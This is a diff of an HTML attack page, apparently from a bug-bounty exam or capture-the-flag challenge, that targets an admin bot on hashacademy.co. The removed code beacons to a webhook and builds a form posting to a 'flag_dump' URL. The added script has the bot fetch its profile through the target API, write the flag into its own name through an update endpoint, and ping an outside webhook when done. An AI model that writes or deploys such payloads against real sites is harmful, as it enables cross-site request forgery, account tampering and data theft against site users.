@@ -2,27 +2,25 @@
 <html>
 <body>
     <script>
-        // 1. Confirm the bot is here
-        new Image().src = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2?step=final_form_loaded";
-
-        // 2. Create a form that points to your webhook
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2/flag_dump';
-
-        // 3. Try to grab the page source from the bot's previous tab
-        // We'll use a hidden input to carry the 'window.name' or 'opener' info
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = 'content';
-        input.value = 'Attempting_Redirect_Leak'; 
-        
-        form.appendChild(input);
-        document.body.appendChild(form);
-
-        // Redirect the bot back to the admin profile, 
-        // but with a payload that submits the data to us
-        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e1012bbee6d6b7c6626a7f";
+        // 1. Fetch the profile (which has the flag)
+        fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/profile')
+        .then(r => r.json())
+        .then(userData => {
+            // 2. The flag is now in 'userData.flag' or 'userData.email'
+            // We force the bot to update its NAME to be the FLAG
+            return fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/update', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    name: userData.flag || "FLAG-NOT-FOUND", 
+                    bio: "Security Audit"
+                })
+            });
+        })
+        .then(() => {
+            // Confirm to your webhook that the attempt finished
+            new Image().src = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2/done";
+        });
     </script>
 </body>
 </html>
